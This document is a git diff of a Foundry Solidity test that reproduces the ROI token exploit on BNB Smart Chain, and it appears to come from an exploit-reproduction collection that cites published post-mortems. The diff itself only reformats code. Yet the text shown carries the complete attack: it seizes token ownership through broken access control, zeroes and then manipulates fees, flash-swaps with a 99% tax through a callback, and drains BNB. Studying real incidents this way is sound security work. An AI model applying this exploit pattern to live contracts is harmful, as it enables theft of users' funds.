@@ -16,7 +16,6 @@ import "./interface.sol";
 // PANews : https://www.panewslab.com/zh_hk/articledetails/mbzalpdi.html
 // QuillAudits Team : https://medium.com/quillhash/decoding-ragnarok-online-invasion-44k-exploit-quillaudits-261b7e23b55
 
-
 CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 IROIToken constant ROI = IROIToken(0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c);
 
@@ -24,10 +23,10 @@ contract Attacker is Test {
     IERC20 constant busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
     IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
-    IPancakePair constant busdroiPair =  IPancakePair(0x745D6Dd206906dd32b3f35E00533AD0963805124); // BUSD/ROI Pair
-    
+    IPancakePair constant busdroiPair = IPancakePair(0x745D6Dd206906dd32b3f35E00533AD0963805124); // BUSD/ROI Pair
+
     function setUp() public {
-        cheat.createSelectFork("bsc", 21143795);
+        cheat.createSelectFork("bsc", 21_143_795);
         cheat.deal(address(this), 5 ether);
         cheat.label(address(ROI), "ROI");
         cheat.label(address(busd), "BUSD");
@@ -49,14 +48,14 @@ contract Attacker is Test {
         path[0] = address(wbnb);
         path[1] = address(busd);
         path[2] = address(ROI); // [WBNB, BUSD, ROI]
-        pancakeRouter.swapETHForExactTokens{value: 5 ether}(111291832999209, path, address(this), block.timestamp); // Swap 5 bnb to busd then swap to ROI, charge 0.25% trading fee
-        
+        pancakeRouter.swapETHForExactTokens{value: 5 ether}(111_291_832_999_209, path, address(this), block.timestamp); // Swap 5 bnb to busd then swap to ROI, charge 0.25% trading fee
+
         console.log("After [WBNB, BUSD, ROI] swap:");
         emit log_named_decimal_uint("\tBNB balance of attacker:", address(this).balance, 18);
         emit log_named_decimal_uint("\tROI balance of attacker:", ROI.balanceOf(address(this)), 9);
         console.log("----------------------------------------------------");
 
-        ROI.transferOwnership(address(this));   // Broken Access Control
+        ROI.transferOwnership(address(this)); // Broken Access Control
         ROI.setTaxFeePercent(0);
         ROI.setBuyFee(0, 0);
         ROI.setSellFee(0, 0);
@@ -81,7 +80,7 @@ contract Attacker is Test {
 
         console.log("Attacker sends all ROI to [BUSD/ROI Pair] but withholding 100,000 ROI");
         uint256 ROI_bal = ROI.balanceOf(address(this));
-        ROI.transfer(address(busdroiPair), ROI_bal - 100000e9); // taxfee is zero
+        ROI.transfer(address(busdroiPair), ROI_bal - 100_000e9); // taxfee is zero
         console.log("----------------------------------------------------");
 
         console.log("Before flashloans from [BUSD/ROI Pair]");
@@ -89,11 +88,11 @@ contract Attacker is Test {
         emit log_named_decimal_uint("\tBUSD balance of attacker:", busd.balanceOf(address(this)), 18);
         emit log_named_decimal_uint("\tROI balance of BUSD/ROI Pair:", ROI.balanceOf(address(busdroiPair)), 9);
         emit log_named_decimal_uint("\tBUSD balance of BUSD/ROI Pair:", busd.balanceOf(address(busdroiPair)), 18);
-        
+
         ROI.setTaxFeePercent(99);
         // Attacker flashloans 4,343,012 ROI from [BUSD/ROI Pair], and attacker will immediately payback
-        busdroiPair.swap(4343012692003417,0,address(this),"3030");  // Notice: 99% taxfee will be charged from the [BUSD/ROI Pair]
-        
+        busdroiPair.swap(4_343_012_692_003_417, 0, address(this), "3030"); // Notice: 99% taxfee will be charged from the [BUSD/ROI Pair]
+
         console.log("After flashloans from [BUSD/ROI Pair]");
         emit log_named_decimal_uint("\tROI balance of attacker:", ROI.balanceOf(address(this)), 9); // Expect 0, Because #L122
         emit log_named_decimal_uint("\tBUSD balance of attacker:", busd.balanceOf(address(this)), 18);
@@ -107,19 +106,20 @@ contract Attacker is Test {
         path[0] = address(ROI);
         path[2] = address(wbnb); // [ROI, BUSD, WBNB]
         ROI.approve(address(pancakeRouter), type(uint256).max);
-        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(3986806268542825, 0, path, address(this), block.timestamp); // Oops, zero ROI balance but the _rOwned[address(this)] has been bypassed
+        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            3_986_806_268_542_825, 0, path, address(this), block.timestamp
+        ); // Oops, zero ROI balance but the _rOwned[address(this)] has been bypassed
         console.log("----------------------------------------------------");
-        emit log_named_decimal_uint("[End] Attacker BNB Balance:", address(this).balance, 18); 
+        emit log_named_decimal_uint("[End] Attacker BNB Balance:", address(this).balance, 18);
     }
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
         require(keccak256(data) == keccak256("3030"), "Invalid PancakeSwap Callback");
-        ROI.transfer(address(busdroiPair), ROI.balanceOf(address(this)));   // Notice: 99% taxfee SHOULD be charged from the attacker
+        ROI.transfer(address(busdroiPair), ROI.balanceOf(address(this))); // Notice: 99% taxfee SHOULD be charged from the attacker
     }
 
     receive() external payable {}
 }
-
 
 /* -------------------- Interface -------------------- */
 
@@ -133,7 +133,18 @@ interface IROIToken {
     function SetSwapMinutes(uint256 newMinutes) external;
     function Sweep() external;
     function Sweep(uint256 amount) external;
-    function _addressFees(address) external view returns (bool enable, uint256 _taxFee, uint256 _liquidityFee, uint256 _buyTaxFee, uint256 _buyLiquidityFee, uint256 _sellTaxFee, uint256 _sellLiquidityFee);
+    function _addressFees(address)
+        external
+        view
+        returns (
+            bool enable,
+            uint256 _taxFee,
+            uint256 _liquidityFee,
+            uint256 _buyTaxFee,
+            uint256 _buyLiquidityFee,
+            uint256 _sellTaxFee,
+            uint256 _sellLiquidityFee
+        );
     function _buyBackDivisor() external view returns (uint256);
     function _buyBackMaxTimeForHistories() external view returns (uint256);
     function _buyBackRangeRate() external view returns (uint256);
@@ -180,9 +191,19 @@ interface IROIToken {
     function prepareForPreSale() external;
     function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external view returns (uint256);
     function renounceOwnership() external;
-    function setAddressFee(address _address, bool _enable, uint256 _addressTaxFee, uint256 _addressLiquidityFee) external;
+    function setAddressFee(
+        address _address,
+        bool _enable,
+        uint256 _addressTaxFee,
+        uint256 _addressLiquidityFee
+    ) external;
     function setAutoBuyBackEnabled(bool _enabled) external;
-    function setBuyAddressFee(address _address, bool _enable, uint256 _addressTaxFee, uint256 _addressLiquidityFee) external;
+    function setBuyAddressFee(
+        address _address,
+        bool _enable,
+        uint256 _addressTaxFee,
+        uint256 _addressLiquidityFee
+    ) external;
     function setBuyBackEnabled(bool _enabled) external;
     function setBuyBackSellLimit(uint256 buyBackSellSetLimit) external;
     function setBuyFee(uint256 buyTaxFee, uint256 buyLiquidityFee) external;
@@ -191,7 +212,12 @@ interface IROIToken {
     function setMarketingDivisor(uint256 divisor) external;
     function setMaxTxAmount(uint256 maxTxAmount) external;
     function setNumTokensSellToAddToBuyBack(uint256 _minimumTokensBeforeSwap) external;
-    function setSellAddressFee(address _address, bool _enable, uint256 _addressTaxFee, uint256 _addressLiquidityFee) external;
+    function setSellAddressFee(
+        address _address,
+        bool _enable,
+        uint256 _addressTaxFee,
+        uint256 _addressLiquidityFee
+    ) external;
     function setSellFee(uint256 sellTaxFee, uint256 sellLiquidityFee) external;
     function setSwapAndLiquifyEnabled(bool _enabled) external;
     function setTaxFeePercent(uint256 taxFee) external;
